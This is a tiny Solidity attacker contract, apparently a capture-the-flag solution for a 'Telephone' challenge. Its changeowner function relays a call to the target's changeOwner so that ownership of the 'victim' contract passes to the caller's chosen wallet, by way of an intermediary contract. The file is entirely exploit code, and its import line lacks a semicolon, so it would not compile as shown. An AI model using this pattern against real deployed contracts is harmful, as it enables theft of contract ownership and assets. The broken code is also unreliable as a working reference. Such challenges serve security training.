// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import "./Telephone.sol"
contract TelephoneA {
Telephone public victim;

constructor(address victim_add) public {
victim= Telephone(victim_add);
}
function changeowner(address your_wallet) public{
victim.changeOwner(your_wallet);
}
}
